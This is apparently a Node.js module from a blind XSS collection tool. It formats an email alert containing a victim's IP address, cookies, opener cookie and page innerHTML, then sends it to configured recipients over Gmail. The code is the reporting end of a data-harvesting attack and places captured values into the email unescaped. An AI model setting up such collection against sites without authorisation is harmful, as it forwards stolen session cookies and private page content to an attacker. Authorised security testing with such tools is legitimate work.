const nodemailer = require('nodemailer');
const config = require('../config/config');

const createTemplate = (guid, domain) => `
  <!DOCTYPE HTML>
  <HTML style="font-family: sans-serif; margin: 0; padding-left: 1em;">
      <body>
              <h1 style="color: #3E5C9F; height: 1em">New XSS Detected for ${domain.URL}</h1>
              <div class="panel panel-default" style="height: 4em">
                  <div class="panel-heading"><h3 style="color: #EE9C4F">URL</h3></div>
                  <div class="panel-body" style="padding-left: 1em"><a href="${domain.URL}" style="text-decoration: none; color: #9EDB46">${domain.URL}</a></div>
              </div>
              <div class="panel panel-default" style="height: 4em">
                  <div class="panel-heading"><h3 style="color: #EE9C4F">Victim IP</h3></div>
                  <div class="panel-body" style="padding-left: 1em"><a href="https://www.whois.com/whois/${domain.victimIP}" style="text-decoration: none; color: #9EDB46">${domain.victimIP}</a></div>
              </div>
              <div class="panel panel-default" style="height: 4em">
                  <div class="panel-heading"><h3 style="color: #EE9C4F">Cookies</h3></div>
                  <div class="panel-body" style="padding-left: 1em; color: #696969">${domain.Cookie}</div>
              </div>    
              <div class="panel panel-default" style="height: 4em">
                      <div class="panel-heading"><h3 style="color: #EE9C4F">openerLocation</h3></div>
                      <div class="panel-body" style="padding-left: 1em; color: #696969">${domain.openerLocation}</div>
              </div>
              <div class="panel panel-default" style="height: 4em">
                      <div class="panel-heading"><h3 style="color: #EE9C4F">openerCookie</h3></div>
                      <div class="panel-body" style="padding-left: 1em; color: #696969">${domain.openerCookie}</div>
              </div>
              <div class="panel panel-default" style="height: 4em">
                  <div class="panel-heading"><h3 style="color: #EE9C4F">innerHTML</h3></div>
                  <div class="panel-body" style="padding: 1em; width: 50%; font-family: courier, Inconsolata; background-color: #DCDCDC; color: black">
                      <pre><code>${domain.innerHTML}</code></pre>
                  </div>
              </div>
      </body>
  </HTML>
  `;


exports.sendMail = (guid, domain) => {
  // TODO: Add more email support options, add tokens rather than creds.
  if (!!config.gmail.user && !!config.gmail.pass && !!config.gmail.to && !!config.gmail.from) {
    const smtpTransport = nodemailer.createTransport({
      service: 'Gmail',
      auth: {
        user: config.gmail.user,
        pass: config.gmail.pass,
      },
    });
    config.gmail.to.forEach((element) => {
      const mailOptions = {
        from: config.gmail.from,
        to: element,
        subject: `New Blind XSS ! | ${domain.URL} ${guid}`,
        html: createTemplate(guid, domain),
      };
      smtpTransport.sendMail(mailOptions, (error, response) => console.log(error || `Mail sent to ${element} for URL ${domain.URL}!`));
    });
  } else {
    console.log('You need to configure your gmail account');
  }
};

